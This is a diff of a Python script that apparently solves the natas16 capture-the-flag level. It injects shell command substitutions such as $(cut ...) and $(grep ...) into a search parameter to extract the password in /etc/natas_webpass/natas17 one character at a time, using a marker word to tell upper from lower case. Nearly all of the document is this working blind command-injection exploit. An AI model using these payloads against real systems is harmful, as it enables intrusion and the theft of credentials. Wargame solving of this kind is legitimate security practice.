@@ -20,20 +20,16 @@ while idx < 32:
     if match == '</pre>':
         print(f"resolving number")
         # generates one . too much, 1 is minimum.
-        # ergo: a 0 outputs .
+        # ergo: idx=1 outputs .
         match = getMatch("^$(printf .%.0s $(seq 0 $(cut -c"+str(idx)+" /etc/natas_webpass/natas17)))$")
         print("mapping length of %s to number" % match)
         match = str(len(match)-1)
     else:
         # alpha char matched, but case not known yet
         match = match[0]
-        # printf %d \'A => ' is not allowed
-        # echo a | od -A n -t d1 => pipe not allowed
-        # ^$(printf .%.0s $(( ord($(cut -c"+str(idx)+" /etc/natas_webpass/natas17)) / 10 )))$") # => len(withCase[0]) in (6,7,8,9) ? upper : lower
-
-        caseMatch = getMatch("^$(echo $([[ $(cut -c%i out.txt) =~ ^[a-z]$ ]] && echo . || echo ..))$" % idx)
-        print(f"caseMatch {caseMatch}")
-        match = match.lower() if len(caseMatch) == 1 else match.upper()
+        caseMatch = getMatch("^$(grep -o ^"+('.'*(idx-1))+"[a-z] /etc/natas_webpass/natas17)$(echo blizzard)$")
+        print(f"case match {caseMatch}")
+        match = match.upper() if caseMatch == 'blizzard' else match.lower()
     pw += match
     print(pw)
     idx += 1
